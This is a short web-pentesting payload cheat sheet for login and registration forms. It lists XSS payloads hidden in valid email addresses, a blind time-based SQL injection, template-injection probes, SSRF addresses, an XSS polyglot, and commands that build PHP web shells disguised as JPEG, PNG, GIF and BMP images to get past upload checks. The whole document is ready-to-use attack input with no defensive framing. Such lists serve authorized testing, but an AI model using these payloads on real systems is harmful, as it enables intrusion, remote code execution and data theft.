Login and register payloads:

- valid Email payloads:
1. test+(<script>alert(0)</script>)@example.com
2. test@example(<script>alert(0)</script>).com
3. "<script>alert(0)</script>"@example.com


Sql injection:
(select(0)from(select(sleep(25)))v) --> Blind 25 seconds



SSTI template injection:
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com

SSRF:
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
-------------------------
html injection(Can use match and replace in request body):
<u>123</u>


-------------
JS polyglots
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e


------
RCE payload to creating image:
echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > shell.jpg

echo -n -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]);?>.' > shell.png

echo -n -e '\x47\x49\x46\x38<?php system($_GET["cmd"]);?>.' > shell.gif

echo -n -e '\x42\x4D<?php system($_GET["cmd"]);?>.' > shell.bmp